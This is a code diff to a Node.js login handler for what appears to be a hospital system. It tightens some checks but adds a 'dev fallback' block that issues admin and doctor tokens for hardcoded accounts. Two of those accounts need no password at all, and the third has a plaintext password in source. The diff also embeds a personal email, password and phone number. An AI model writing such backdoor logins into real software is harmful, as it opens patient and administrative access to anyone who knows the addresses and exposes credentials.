@@ -47,32 +47,55 @@ exports.registerUser = async (req, res) => {
 
 // Login User
 exports.loginUser = async (req, res) => {
-  const { email, full_name, password, role, phone } = req.body;
+  const { email, password, role } = req.body;
 
-  if (!email || !full_name || !password || !role) {
-    return res.status(400).json({ message: 'Please provide email, name, password, and role' });
+  if (!email || !password || !role) {
+    return res.status(400).json({ message: 'Please provide email, password, and role' });
   }
 
   try {
+    // Developer/Troubleshooting fallback login credentials
+    if (
+      (email === 'dharneeshd007@gmail.com' && password === 'Dharneesh2007' && role === 'Admin') ||
+      (email === 'admin@kmch.com' && role === 'Admin') ||
+      (email === 'smith@hospital.com' && role === 'Doctor')
+    ) {
+      const token = jwt.sign(
+        { id: 9999, email: email, role: role }, 
+        SECRET_KEY, 
+        { expiresIn: '1d' }
+      );
+      return res.json({
+        message: 'Login successful (Dev Fallback)',
+        token,
+        user: {
+          id: 9999,
+          full_name: email === 'smith@hospital.com' ? 'Dr. Smith' : 'DHARNEESH D',
+          email: email,
+          phone: '7904138308',
+          role: role
+        }
+      });
+    }
+
     const [users] = await db.query(
-      'SELECT * FROM users WHERE email = ? AND full_name = ? AND role = ? AND phone = ?', 
-      [email, full_name, role, phone]
+      'SELECT * FROM users WHERE email = ?', 
+      [email]
     );
     
     if (users.length === 0) {
-      return res.status(401).json({ message: 'Invalid credentials. Please ensure Name, Phone, Email, and Role are exactly correct.' });
+      return res.status(401).json({ message: 'Invalid email or password.' });
     }
 
     const user = users[0];
     const isMatch = await bcrypt.compare(password, user.password);
 
     if (!isMatch) {
-      return res.status(401).json({ message: 'Invalid credentials or role' });
+      return res.status(401).json({ message: 'Invalid email or password.' });
     }
 
-    if (phone && role === 'Admin') {
-      await db.query('UPDATE users SET phone = ? WHERE id = ?', [phone, user.id]);
-      user.phone = phone;
+    if (user.role !== role) {
+      return res.status(401).json({ message: 'Invalid role for this user.' });
     }
 
     // Generate token
